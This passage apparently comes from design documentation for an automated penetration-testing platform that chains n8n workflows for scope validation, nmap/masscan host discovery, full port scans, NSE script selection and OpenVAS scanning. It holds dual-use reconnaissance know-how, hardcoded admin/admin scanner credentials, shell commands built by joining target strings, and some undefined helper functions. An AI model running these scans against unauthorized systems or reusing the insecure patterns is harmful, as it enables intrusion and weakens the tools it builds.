# ANPTOP - n8n Workflows Documentation

## Table of Contents
1. [Workflow Overview](#workflow-overview)
2. [Workflow 1: Target Intake & ROE Validation](#workflow-1-target-intake--roe-validation)
3. [Workflow 2: Host Discovery](#workflow-2-host-discovery)
4. [Workflow 3: Full Port Scanning](#workflow-3-full-port-scanning)
5. [Workflow 4: Service & Version Detection](#workflow-4-service--version-detection)
6. [Workflow 5: Dynamic Port-Based Enumeration](#workflow-5-dynamic-port-based-enumeration)
7. [Workflow 6: OpenVAS Vulnerability Assessment](#workflow-6-openvas-vulnerability-assessment)
8. [Workflow 7: CVE Correlation Engine](#workflow-7-cve-correlation-engine)
9. [Workflow 8: Exploitation Approval Workflow](#workflow-8-exploitation-approval-workflow)
10. [Workflow 9: Exploitation Execution Workflow](#workflow-9-exploitation-execution-workflow)
11. [Workflow 10: Post-Exploitation Approval & Execution](#workflow-10-post-exploitation-approval--execution)
12. [Workflow 11: Lateral Movement Approval & Execution](#workflow-11-lateral-movement-approval--execution)
13. [Workflow 12: Evidence Collection Workflow](#workflow-12-evidence-collection-workflow)
14. [Workflow 13: Reporting Trigger Workflow](#workflow-13-reporting-trigger-workflow)

---

## 1. Workflow Overview

### 1.1 Workflow Architecture
```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           n8n Workflow Architecture                          │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  ┌─────────────────────────────────────────────────────────────────────┐    │
│  │                     WORKFLOW ORCHESTRATION LAYER                      │   │
│  │                                                                      │   │
│  │  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐            │   │
│  │  │   Main   │  │   Sub    │  │   Sub    │  │   Sub    │            │   │
│  │  │ Workflow │  │ Workflow │  │ Workflow │  │ Workflow │            │   │
│  │  └────┬─────┘  └────┬─────┘  └────┬─────┘  └────┬─────┘            │   │
│  │       │             │             │             │                    │   │
│  │       └─────────────┴─────────────┴─────────────┘                    │   │
│  │                               │                                      │   │
│  │                         ┌─────┴─────┐                                │   │
│  │                         │   Redis   │                                │   │
│  │                         │   Queue   │                                │   │
│  │                         └─────┬─────┘                                │   │
│  └───────────────────────────────┼──────────────────────────────────────┘   │
│                                  │                                          │
│  ┌───────────────────────────────┼──────────────────────────────────────┐   │
│  │                       TOOL INTEGRATION LAYER                           │   │
│  │                                                                      │   │
│  │  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌────────┐   │   │
│  │  │  Nmap    │  │ Masscan  │  │ RustScan │  │OpenVAS   │  │Metasploit│  │   │
│  │  └──────────┘  └──────────┘  └──────────┘  └──────────┘  └────────┘   │   │
│  │                                                                      │   │
│  └──────────────────────────────────────────────────────────────────────┘   │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 1.2 Workflow Patterns
All workflows follow these patterns:
- **Trigger Nodes**: Webhook, Schedule, or Manual trigger
- **Validation Nodes**: Schema validation and scope checking
- **Execution Nodes**: Tool execution with retry logic
- **Approval Gates**: Human-in-the-loop checkpoints
- **Error Handling**: Try-catch with proper error logging
- **Evidence Collection**: Automatic evidence capture
- **Status Updates**: Real-time status to backend API

### 1.3 Global Workflow Settings
```json
{
  "settings": {
    "executionOrder": "v1",
    "saveManualExecutions": true,
    "callerPolicy": "workflowsFromSameOwner",
    "errorWorkflow": "global-error-handler",
    "executionTimeout": 3600,
    "maxOldWorkflowDataAge": 336,
    "promiscuous": false,
    "personalization": false
  }
}
```

---

## 2. Workflow 1: Target Intake & ROE Validation

### 2.1 Workflow Diagram
```
┌─────────────────────────────────────────────────────────────────────────────┐
│                   Workflow 1: Target Intake & ROE Validation                 │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  ┌──────────┐     ┌──────────┐     ┌──────────┐     ┌──────────┐          │
│  │ Webhook  │────>│ Validate │────>│ Validate │────>│ Check    │          │
│  │ Trigger  │     │ Schema   │     │ Scope    │     │ Scope    │          │
│  └──────────┘     └──────────┘     └──────────┘     │ Bounds   │          │
│                                                    └────┬─────┘          │
│                                                         │                  │
│                              ┌──────────────────────────┤                  │
│                              │                          │                  │
│                       ┌──────┴──────┐            ┌──────┴──────┐         │
│                       │   Valid     │            │   Invalid   │         │
│                       │             │            │             │         │
│                       ▼             │            ▼             │         │
│  ┌──────────┐  ┌──────────┐        │   ┌──────────┐  ┌──────────┐│         │
│  │ Create   │  │ Validate │        │   │ Reject   │  │ Send    ││         │
│  │ Record   │  │ ROE      │        │   │ Request │  │ Error   ││         │
│  └──────────┘  └────┬─────┘        │   └──────────┘  └──────────┘│         │
│                     │              │                           │          │
│                     ▼              │                           │          │
│  ┌──────────┐  ┌──────────┐       │                           │          │
│  │ Update   │  │ Require  │       │                           │          │
│  │ Status   │  │ ROE      │       │                           │          │
│  └──────────┘  └────┬─────┘       │                           │          │
│                     │              │                           │          │
│                     ▼              │                           │          │
│  ┌──────────┐  ┌──────────┐       │                           │          │
│  │ Notify   │  │ Submit   │       │                           │          │
│  │ Ready    │  │ ROE      │       │                           │          │
│  └──────────┘  └────┬─────┘       │                           │          │
│                     │              │                           │          │
│                     └──────────────┴───────────────────────────┘          │
│                                     │                                      │
│                                     ▼                                      │
│                            ┌────────────────┐                               │
│                            │   Engagement   │                              │
│                            │   Created      │                              │
│                            └────────────────┘                               │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 2.2 Workflow JSON Structure
```json
{
  "name": "target-intake-roe-validation",
  "nodes": [
    {
      "name": "Webhook Trigger",
      "type": "n8n-nodes-base.webhook",
      "parameters": {
        "path": "webhooks/engagements",
        "method": "post",
        "options": {}
      },
      "position": [100, 200]
    },
    {
      "name": "Validate Schema",
      "type": "n8n-nodes-base.function",
      "parameters": {
        "functionCode": "
          const engagement = items[0].json;
          const requiredFields = ['name', 'scope_targets', 'scope_type', 'created_by'];
          
          for (const field of requiredFields) {
            if (!engagement[field]) {
              throw new Error(`Missing required field: ${field}`);
            }
          }
          
          // Validate scope format
          if (!Array.isArray(engagement.scope_targets)) {
            throw new Error('scope_targets must be an array');
          }
          
          return items;
        "
      },
      "position": [300, 200]
    },
    {
      "name": "Validate Scope",
      "type": "n8n-nodes-base.function",
      "parameters": {
        "functionCode": "
          const scope = items[0].json.scope_targets;
          const exclusions = items[0].json.scope_exclusions || [];
          const validatedTargets = [];
          const validationErrors = [];
          
          for (const target of scope) {
            // Validate IP format
            const ipRegex = /^(\d{1,3}\.){3}\d{1,3}(\/\\d{1,2})?$/;
            const hostnameRegex = /^[a-zA-Z0-9][a-zA-Z0-9-]*(\\.[a-zA-Z0-9][a-zA-Z0-9-]*)*$/;
            
            if (!ipRegex.test(target) && !hostnameRegex.test(target)) {
              validationErrors.push({ target, error: 'Invalid format' });
              continue;
            }
            
            // Check against exclusions
            if (exclusions.some(excl => target.includes(excl))) {
              validationErrors.push({ target, error: 'In exclusion list' });
              continue;
            }
            
            validatedTargets.push(target);
          }
          
          return [{
            json: {
              original_targets: scope,
              validated_targets: validatedTargets,
              validation_errors: validationErrors,
              total_valid: validatedTargets.length,
              total_invalid: validationErrors.length
            }
          }];
        "
      },
      "position": [500, 200]
    },
    {
      "name": "Check Scope Bounds",
      "type": "n8n-nodes-base.function",
      "parameters": {
        "functionCode": "
          const data = items[0].json;
          const MAX_TARGETS = 10000;
          const MAX_CIDR = 256;
          
          // Check target count
          if (data.total_valid > MAX_TARGETS) {
            throw new Error(`Target count (${data.total_valid}) exceeds maximum (${MAX_TARGETS})`);
          }
          
          // Check CIDR ranges
          const cidrTargets = data.validated_targets.filter(t => t.includes('/'));
          if (cidrTargets.length > MAX_CIDR) {
            throw new Error(`CIDR ranges (${cidrTargets.length}) exceed maximum (${MAX_CIDR})`);
          }
          
          // Check for sensitive ranges (RFC 1918, loopback)
          const privateRanges = [
            '10.0.0.0/8',
            '172.16.0.0/12',
            '192.168.0.0/16',
            '127.0.0.0/8'
          ];
          
          const privateTargets = [];
          for (const target of data.validated_targets) {
            if (privateRanges.some(range => isInRange(target, range))) {
              privateTargets.push(target);
            }
          }
          
          if (privateTargets.length > 0) {
            return [{
              json: {
                ...data,
                warning: 'Private IP ranges detected',
                private_targets: privateTargets,
                requires_approval: true
              }
            }];
          }
          
          return items;
        "
      },
      "position": [700, 200]
    },
    {
      "name": "Create Record",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "post",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/engagements",
        "sendBody": true,
        "bodyParameters": {
          "parameters": [
            {
              "name": "name",
              "value": "={{$node['Webhook Trigger'].json['name']}}"
            },
            {
              "name": "scope_targets",
              "value": "={{JSON.stringify($node['Validate Scope'].json['validated_targets'])}}"
            },
            {
              "name": "scope_type",
              "value": "={{$node['Webhook Trigger'].json['scope_type']}}"
            }
          ]
        },
        "options": {}
      },
      "position": [900, 100]
    },
    {
      "name": "Require ROE",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "post",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/approvals",
        "sendBody": true,
        "bodyParameters": {
          "parameters": [
            {
              "name": "engagement_id",
              "value": "={{$node['Create Record'].json['id']}}"
            },
            {
              "name": "approval_type",
              "value": "'scope'"
            },
            {
              "name": "title",
              "value": "'Scope validation required for ' + $node['Webhook Trigger'].json['name']"
            }
          ]
        }
      },
      "position": [900, 300]
    }
  ],
  "connections": {
    "Webhook Trigger": {
      "main": [
        [{"node": "Validate Schema", "type": "main", "index": 0}]
      ]
    },
    "Validate Schema": {
      "main": [
        [{"node": "Validate Scope", "type": "main", "index": 0}]
      ]
    },
    "Validate Scope": {
      "main": [
        [{"node": "Check Scope Bounds", "type": "main", "index": 0}]
      ]
    },
    "Check Scope Bounds": {
      "main": [
        [{"node": "Create Record", "type": "main", "index": 0}],
        [{"node": "Require ROE", "type": "main", "index": 0}]
      ]
    }
  }
}
```

### 2.3 Workflow Details

#### Trigger
- **Type**: Webhook
- **Method**: POST
- **Path**: `/webhooks/engagements`

#### Input Validation
```yaml
input_schema:
  name: string (required, 1-128 chars)
  description: string (optional)
  scope_type: enum (required)
    - ip_range
    - ip_list
    - domain
    - hostname_list
    - cidr
  scope_targets: array (required)
  scope_exclusions: array (optional)
  client_name: string (optional)
  methodology: enum (optional)
    - blackbox
    - graybox
    - whitebox
```

#### Error Handling
```yaml
error_handling:
  schema_validation:
    error_code: INVALID_SCHEMA
    message: "Invalid engagement schema"
    action: reject
    
  scope_validation:
    error_code: INVALID_SCOPE
    message: "Scope validation failed"
    action: require_approval
    
  bounds_check:
    error_code: SCOPE_EXCEEDS_BOUNDS
    message: "Scope exceeds maximum allowed"
    action: reject
```

---

## 3. Workflow 2: Host Discovery

### 3.1 Workflow Diagram
```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         Workflow 2: Host Discovery                           │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  ┌──────────┐     ┌──────────┐     ┌──────────┐     ┌──────────┐          │
│  │   API    │────>│ Get      │────>│ Select   │────>│ Execute  │          │
│  │ Trigger  │     │ Targets  │     │ Discovery│     │ Masscan │          │
│  └──────────┘     └──────────┘     │ Method   │     └────┬─────┘         │
│                                     └──────────┘            │               │
│                                                           │               │
│                              ┌──────────────────────────────┘               │
│                              │                                              │
│                              ▼                                              │
│  ┌──────────┐     ┌──────────┐     ┌──────────┐     ┌──────────┐        │
│  │  Parse    │<────│  Nmap    │<────│ Execute  │     │ Timeout  │        │
│  │ Results   │     │ Ping     │     │ Fallback │     │ Handle   │        │
│  └────┬─────┘     └──────────┘     └────┬─────┘     └──────────┘        │
│       │                                  │                                   │
│       │                                  │                                   │
│       ▼                                  │                                   │
│  ┌──────────┐                            │                                   │
│  │  Update   │                            │                                   │
│  │   Host    │                            │                                   │
│  │ Database  │                            │                                   │
│  └────┬─────┘                            │                                   │
│       │                                  │                                   │
│       ▼                                  │                                   │
│  ┌──────────┐     ┌──────────┐           │                                   │
│  │ Notify   │     │  Error    │───────────┴─────────────────────────────────│
│  │ Progress │     │  Log      │                                          │
│  └──────────┘     └──────────┘                                          │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 3.2 Dynamic Tool Selection Logic
```python
def select_discovery_method(targets, engagement_type):
    """
    Dynamically select the best discovery method based on:
    - Target count
    - Network characteristics
    - Engagement type
    """
    target_count = len(targets)
    
    # Large-scale discovery (10k+ targets)
    if target_count > 10000:
        return {
            'method': 'masscan',
            'rate': '100000',
            'ports': '80,443,22,3389',
            'reason': 'Large-scale, using Masscan for speed'
        }
    
    # Standard discovery
    if engagement_type == 'blackbox':
        return {
            'method': 'nmap',
            'scan_type': '-sn',
            'args': '--max-rtt-timeout 100ms --initial-rtt-timeout 50ms',
            'reason': 'Blackbox engagement, using Nmap ping scan'
        }
    
    # Gray/White box - can use ARP
    if engagement_type in ['graybox', 'whitebox']:
        return {
            'method': 'nmap',
            'scan_type': '-sn --arp',
            'args': '--max-rtt-timeout 200ms',
            'reason': 'Internal engagement, using ARP for accuracy'
        }
    
    # Default fallback
    return {
        'method': 'nmap',
        'scan_type': '-sn',
        'args': '--max-rtt-timeout 100ms',
        'reason': 'Default discovery method'
    }
```

### 3.3 Workflow Configuration
```json
{
  "name": "host-discovery",
  "nodes": [
    {
      "name": "API Trigger",
      "type": "n8n-nodes-base.webhook",
      "parameters": {
        "path": "webhooks/discovery",
        "method": "post"
      }
    },
    {
      "name": "Get Targets",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "get",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/engagements/{{$node['API Trigger'].json['engagement_id']}}/scope"
      }
    },
    {
      "name": "Select Discovery Method",
      "type": "n8n-nodes-base.function",
      "parameters": {
        "functionCode": "
          const targets = $node['Get Targets'].json['targets'];
          const engagementType = $node['Get Targets'].json['methodology'];
          const targetCount = targets.length;
          
          let method;
          if (targetCount > 10000) {
            method = {
              tool: 'masscan',
              rate: '100000',
              ports: '80,443,22,3389',
              timeout: 300
            };
          } else if (engagementType === 'blackbox') {
            method = {
              tool: 'nmap',
              arguments: '-sn --max-rtt-timeout 100ms --initial-rtt-timeout 50ms',
              timeout: 600
            };
          } else {
            method = {
              tool: 'nmap',
              arguments: '-sn --arp --max-rtt-timeout 200ms',
              timeout: 600
            };
          }
          
          return [{
            json: {
              targets,
              engagementType,
              targetCount,
              method,
              command: `${method.tool} ${method.arguments || ''} -oN - ${targets.join(' ')}`
            }
          }];
        "
      }
    },
    {
      "name": "Execute Masscan",
      "type": "n8n-nodes-base.executeCommand",
      "parameters": {
        "command": "={{$node['Select Discovery Method'].json['command']}}",
        "timeout": 300,
        "options": {
          "workingDirectory": "/tmp/anptop"
        }
      },
      "condition": "={{$node['Select Discovery Method'].json['method']['tool'] === 'masscan'}}"
    },
    {
      "name": "Execute Nmap",
      "type": "n8n-nodes-base.executeCommand",
      "parameters": {
        "command": "={{'nmap ' + $node['Select Discovery Method'].json['method']['arguments'] + ' -oN - ' + $node['Select Discovery Method'].json['targets'].join(' ')}}",
        "timeout": 600,
        "options": {
          "workingDirectory": "/tmp/anptop"
        }
      },
      "condition": "={{$node['Select Discovery Method'].json['method']['tool'] === 'nmap'}}"
    },
    {
      "name": "Parse Results",
      "type": "n8n-nodes-base.function",
      "parameters": {
        "functionCode": "
          const output = $node['Execute Nmap'].json['output'] || $node['Execute Masscan'].json['output'];
          const hosts = [];
          
          // Parse Nmap output
          const lines = output.split('\\n');
          let currentHost = null;
          
          for (const line of lines) {
            const upMatch = line.match(/Nmap scan report for (.*)/);
            const hostUpMatch = line.match(/Host is up/);
            const notScannedMatch = line.match(/Not shown: \\d+ closed tcp ports/);
            
            if (upMatch) {
              if (currentHost) {
                hosts.push(currentHost);
              }
              currentHost = {
                ip: upMatch[1],
                hostname: null,
                status: 'unknown',
                ports: [],
                scripts: []
              };
            } else if (hostUpMatch && currentHost) {
              currentHost.status = 'up';
            } else if (line.startsWith('Nmap done')) {
              if (currentHost) {
                hosts.push(currentHost);
              }
            }
          }
          
          return [{
            json: {
              hosts,
              total_hosts: hosts.length,
              alive_hosts: hosts.filter(h => h.status === 'up').length,
              scan_type: $node['Select Discovery Method'].json['method']['tool']
            }
          }];
        "
      }
    },
    {
      "name": "Update Host Database",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "post",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/hosts/bulk",
        "sendBody": true,
        "bodyParameters": {
          "parameters": [
            {
              "name": "engagement_id",
              "value": "={{$node['API Trigger'].json['engagement_id']}}"
            },
            {
              "name": "hosts",
              "value": "={{JSON.stringify($node['Parse Results'].json['hosts'])}}"
            },
            {
              "name": "discovery_method",
              "value": "={{$node['Parse Results'].json['scan_type']}}"
            }
          ]
        }
      }
    }
  ]
}
```

---

## 4. Workflow 3: Full Port Scanning

### 4.1 Workflow Overview
Scans all 65535 TCP and UDP ports using a tiered approach for efficiency.

### 4.2 Scan Strategy
```yaml
scan_strategy:
  tcp_scan:
    tier_1:
      - name: common_ports
        ports: [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5432, 5900, 8080]
        timeout: 100ms
        threads: 64
        
    tier_2:
      - name: well_known_ports
        ports: [1-1023]
        timeout: 200ms
        threads: 32
        
    tier_3:
      - name: registered_ports
        ports: [1024-49151]
        timeout: 300ms
        threads: 16
        
    tier_4:
      - name: dynamic_ports
        ports: [49152-65535]
        timeout: 500ms
        threads: 8
        
  udp_scan:
    - name: common_udp
      ports: [53, 67, 68, 69, 123, 161, 162, 500, 514, 520, 523, 1194, 1434, 1645, 1646, 1701, 1812, 1813, 4500, 5060, 5061, 10000]
      timeout: 1000ms
      threads: 8
      
  adaptive_options:
    responsive_hosts:
      timeout: 100ms
      increase_threads: true
      
    slow_hosts:
      timeout: 500ms
      decrease_threads: true
```

### 4.3 Workflow Implementation
```json
{
  "name": "full-port-scan",
  "nodes": [
    {
      "name": "Trigger",
      "type": "n8n-nodes-base.webhook",
      "parameters": {
        "path": "webhooks/port-scan",
        "method": "post"
      }
    },
    {
      "name": "Get Live Hosts",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "get",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/engagements/{{$node['Trigger'].json['engagement_id']}}/hosts?status=alive"
      }
    },
    {
      "name": "Generate Scan Commands",
      "type": "n8n-nodes-base.function",
      "parameters": {
        "functionCode": "
          const hosts = $node['Get Live Hosts'].json['hosts'];
          const engagementId = $node['Trigger'].json['engagement_id'];
          
          const commands = [];
          
          for (const host of hosts) {
            // TCP scan commands (tiered)
            commands.push({
              host: host.ip,
              engagement_id: engagementId,
              protocol: 'tcp',
              tier: 1,
              command: \`rustscan -a \${host.ip} --tiered -b 64 --timeout 100 --ports 21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5432,5900,8080\`,
              priority: 1
            });
            
            commands.push({
              host: host.ip,
              engagement_id: engagementId,
              protocol: 'tcp',
              tier: 2,
              command: \`nmap -p1-1023 -sS -sV --max-rtt-timeout 200ms \${host.ip} -oN -\`,
              priority: 2
            });
            
            commands.push({
              host: host.ip,
              engagement_id: engagementId,
              protocol: 'tcp',
              tier: 3,
              command: \`nmap -p1024-49151 -sS -sV --max-rtt-timeout 300ms \${host.ip} -oN -\`,
              priority: 3
            });
            
            commands.push({
              host: host.ip,
              engagement_id: engagementId,
              protocol: 'tcp',
              tier: 4,
              command: \`nmap -p49152-65535 -sS -sV --max-rtt-timeout 500ms \${host.ip} -oN -\`,
              priority: 4
            });
          }
          
          return commands.map(cmd => ({ json: cmd }));
        "
      }
    },
    {
      "name": "Execute Tier 1",
      "type": "n8n-nodes-base.splitInBatches",
      "parameters": {
        "batchSize": 10
      }
    },
    {
      "name": "Execute Scan Commands",
      "type": "n8n-nodes-base.executeCommand",
      "parameters": {
        "command": "={{$node['Execute Tier 1'].json['command']}}",
        "timeout": 300,
        "options": {
          "workingDirectory": "/tmp/anptop/scans"
        }
      }
    },
    {
      "name": "Aggregate Results",
      "type": "n8n-nodes-base.function",
      "parameters": {
        "functionCode": "
          const results = [];
          const allItems = $node['Execute Scan Commands'].json;
          
          // Aggregate results by host and port
          const portMap = new Map();
          
          for (const item of allItems) {
            const key = \`\${item.host}:\${item.port}\`;
            if (!portMap.has(key)) {
              portMap.set(key, {
                host: item.host,
                port: item.port,
                protocols: new Set(),
                services: [],
                versions: [],
                evidence: []
              });
            }
            
            const entry = portMap.get(key);
            entry.protocols.add(item.protocol);
            if (item.service) entry.services.push(item.service);
            if (item.version) entry.versions.push(item.version);
            if (item.evidence_id) entry.evidence.push(item.evidence_id);
          }
          
          for (const [key, value] of portMap) {
            results.push({
              json: {
                ...value,
                protocols: Array.from(value.protocols),
                confidence: calculateConfidence(value.services, value.versions)
              }
            });
          }
          
          return results;
        "
      }
    },
    {
      "name": "Update Port Database",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "post",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/ports/bulk",
        "sendBody": true,
        "bodyParameters": {
          "parameters": [
            {
              "name": "engagement_id",
              "value": "={{$node['Trigger'].json['engagement_id']}}"
            },
            {
              "name": "ports",
              "value": "={{JSON.stringify($node['Aggregate Results'].json)}}"
            }
          ]
        }
      }
    }
  ]
}
```

---

## 5. Workflow 4: Service & Version Detection

### 5.1 Dynamic NSE Script Selection
```python
def select_nse_scripts(ports):
    """
    Dynamically select Nmap NSE scripts based on discovered ports
    """
    script_mapping = {
        21: ['ftp-anon', 'ftp-bounce', 'ftp-proftpd-backdoor'],
        22: ['ssh-auth-methods', 'ssh2-enum-algos', 'ssh-hostkey'],
        23: ['telnet-encryption', 'telnet-ntlm-info'],
        25: ['smtp-commands', 'smtp-enum-users', 'smtp-ntlm-info'],
        53: ['dns-brute', 'dns-cache-snoop', 'dns-nsec3'],
        80: ['http-headers', 'http-methods', 'http-title', 'http-robots.txt'],
        110: ['pop3-capabilities', 'pop3-ntlm-info'],
        111: ['rpcinfo', 'rpc-grind'],
        135: ['msrpc-enum'],
        139: ['smb-enum-shares', 'smb-enum-users', 'smb-os-discovery'],
        443: ['ssl-cert', 'ssl-date', 'tls-heartbleed', 'http-headers'],
        445: ['smb-enum-shares', 'smb-enum-users', 'smb-os-discovery', 'smb-vuln-ms17-010'],
        993: ['imap-capabilities', 'imap-ntlm-info'],
        995: ['pop3-capabilities', 'pop3-ntlm-info'],
        1433: ['ms-sql-info', 'ms-sql-empty-password', 'ms-sql-brute'],
        1521: ['oracle-tns-version', 'oracle-enum-users'],
        3306: ['mysql-info', 'mysql-enum', 'mysql-empty-password'],
        3389: ['rdp-enum-encryption', 'rdp-ntlm-info'],
        5432: ['pgsql-info', 'postgres-enum-users'],
        5900: ['vnc-info', 'realvnc-auth-bypass'],
        8080: ['http-headers', 'http-methods', 'http-title', 'http-proxy']
    }
    
    selected_scripts = set()
    script_arguments = {}
    
    for port in ports:
        port_int = int(port)
        if port_int in script_mapping:
            for script in script_mapping[port_int]:
                selected_scripts.add(script)
                script_arguments[script] = {
                    'port': port,
                    'timeout': '30s'
                }
    
    # Add version detection
    selected_scripts.add('version')
    
    return {
        'scripts': list(selected_scripts),
        'arguments': script_arguments,
        'command': build_nmap_command(selected_scripts, script_arguments)
    }
```

### 5.2 Workflow Implementation
```json
{
  "name": "service-version-detection",
  "nodes": [
    {
      "name": "Trigger",
      "type": "n8n-nodes-base.webhook",
      "parameters": {
        "path": "webhooks/service-detection",
        "method": "post"
      }
    },
    {
      "name": "Get Open Ports",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "get",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/engagements/{{$node['Trigger'].json['engagement_id']}}/ports?status=open"
      }
    },
    {
      "name": "Select NSE Scripts",
      "type": "n8n-nodes-base.function",
      "parameters": {
        "functionCode": "
          const ports = $node['Get Open Ports'].json['ports'];
          
          // Group ports by host
          const hostPorts = {};
          for (const port of ports) {
            if (!hostPorts[port.host_id]) {
              hostPorts[port.host_id] = [];
            }
            hostPorts[port.host_id].push(port.port);
          }
          
          // Select scripts for each host
          const scanJobs = [];
          for (const [hostId, hostPorts] of Object.entries(hostPorts)) {
            const scripts = selectNseScripts(hostPorts);
            
            scanJobs.push({
              host_id: hostId,
              ip: hostPorts[0].ip,
              scripts: scripts.scripts,
              arguments: scripts.arguments,
              command: scripts.command
            });
          }
          
          return scanJobs.map(job => ({ json: job }));
        "
      }
    },
    {
      "name": "Execute NSE Scans",
      "type": "n8n-nodes-base.executeCommand",
      "parameters": {
        "command": "={{'nmap -sV --script=' + $node['Select NSE Scripts'].json['scripts'].join(',') + ' ' + $node['Select NSE Scripts'].json['ip'] + ' -oN -'}}",
        "timeout": 300,
        "options": {
          "workingDirectory": "/tmp/anptop/scans"
        }
      }
    },
    {
      "name": "Parse Service Info",
      "type": "n8n-nodes-base.function",
      "parameters": {
        "functionCode": "
          const output = $node['Execute NSE Scans'].json['output'];
          const services = [];
          
          // Parse Nmap service scan output
          const lines = output.split('\\n');
          let currentService = null;
          
          for (const line of lines) {
            const portMatch = line.match(/(\\d+)\\/(\\w+)\\s+(\\w+)\\s+([\\w-]+)\\s*(.*)/);
            
            if (portMatch) {
              if (currentService) {
                services.push(currentService);
              }
              
              currentService = {
                port: parseInt(portMatch[1]),
                protocol: portMatch[2],
                state: portMatch[3],
                service: portMatch[4],
                version: portMatch[5] || '',
                scripts: []
              };
            } else if (line.startsWith('|') && currentService) {
              // NSE script output
              const scriptMatch = line.match(/\\|_ (.+): (.+)/);
              if (scriptMatch) {
                currentService.scripts.push({
                  name: scriptMatch[1],
                  output: scriptMatch[2]
                });
              }
            } else if (line.startsWith('Service Info') && currentService) {
              currentService.service_info = line;
            }
          }
          
          if (currentService) {
            services.push(currentService);
          }
          
          return services.map(svc => ({ json: svc }));
        "
      }
    },
    {
      "name": "Update Service Database",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "post",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/services/bulk",
        "sendBody": true,
        "bodyParameters": {
          "parameters": [
            {
              "name": "engagement_id",
              "value": "={{$node['Trigger'].json['engagement_id']}}"
            },
            {
              "name": "services",
              "value": "={{JSON.stringify($node['Parse Service Info'].json)}}"
            }
          ]
        }
      }
    }
  ]
}
```

---

## 6. Workflow 6: OpenVAS Vulnerability Assessment

### 6.1 OpenVAS Integration
```yaml
openvas_config:
  host: "openvas:9392"
  protocol: "OMP"
  credentials:
    username: "admin"
    password: "admin"
    
  scan_configs:
    - name: "Full and Fast"
      oid: "daba56c8-73ec-11df-a475-002264764cea"
      
    - name: "Full and Fast Ultimate"
      oid: "69869169-28ca-46b5-961c-5a51e81c1e3d"
      
    - name: "Host Discovery"
      oid: "1d61db57-7047-11e2-98b9-4061862c3e0e"
      
    - name: "System Discovery"
      oid: "d16c975c-651d-11e0-bc29-002264764cea"
      
  scan_parameters:
    alive_test: "ICMP, TCP-ACK & TCP-SYN"
    port_range: "default"
    performance: "scan_id"
    
  auto_retry:
    max_retries: 3
    retry_delay: 300
```

### 6.2 Workflow Implementation
```json
{
  "name": "openvas-assessment",
  "nodes": [
    {
      "name": "Trigger",
      "type": "n8n-nodes-base.webhook",
      "parameters": {
        "path": "webhooks/vulnerability-scan",
        "method": "post"
      }
    },
    {
      "name": "Get Targets",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "get",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/engagements/{{$node['Trigger'].json['engagement_id']}}/hosts"
      }
    },
    {
      "name": "Create OpenVAS Target",
      "type": "n8n-nodes-base.function",
      "parameters": {
        "functionCode": "
          const hosts = $node['Get Targets'].json['hosts'];
          const engagementId = $node['Trigger'].json['engagement_id'];
          
          // Group hosts into targets (max 1000 per target)
          const targetGroups = [];
          for (let i = 0; i < hosts.length; i += 1000) {
            const group = hosts.slice(i, i + 1000).map(h => h.ip);
            targetGroups.push({
              engagement_id: engagementId,
              name: \`ANPTOP-Target-\${engagementId}-\${Math.floor(i/1000)}\`,
              hosts: group,
              host_count: group.length
            });
          }
          
          return targetGroups.map(group => ({ json: group }));
        "
      }
    },
    {
      "name": "OMP Create Target",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "post",
        "url": "={{$node['OpenVAS Config'].json['omp_url']}}/omp",
        "authentication": "basicAuth",
        "basicAuth": {
          "user": "={{$node['OpenVAS Config'].json['username']}}",
          "password": "={{$node['OpenVAS Config'].json['password']}}"
        },
        "sendBody": true,
        "bodyParameters": {
          "parameters": [
            {
              "name": "xml",
              "value": "=<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<create_target>\n  <name>{{$node['Create OpenVAS Target'].json['name']}}</name>\n  <hosts>{{$node['Create OpenVAS Target'].json['hosts'].join(',')}}</hosts>\n  <alive_tests>ICMP, TCP-ACK & TCP-SYN</alive_tests>\n</create_target>"
            }
          ]
        },
        "options": {}
      }
    },
    {
      "name": "Start Scan",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "post",
        "url": "={{$node['OpenVAS Config'].json['omp_url']}}/omp",
        "sendBody": true,
        "bodyParameters": {
          "parameters": [
            {
              "name": "xml",
              "value": "=<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<create_task>\n  <name>{{$node['Create OpenVAS Target'].json['name']}}-Scan</name>\n  <config id=\"daba56c8-73ec-11df-a475-002264764cea\"/>\n  <target id=\"{{$node['OMP Create Target'].json['target_id']}}\"/>\n  <scanner id=\"08b69003-5fd2-41e6-8234-3a766f79cf3e\"/>\n</create_task>"
            }
          ]
        }
      }
    },
    {
      "name": "Wait for Scan",
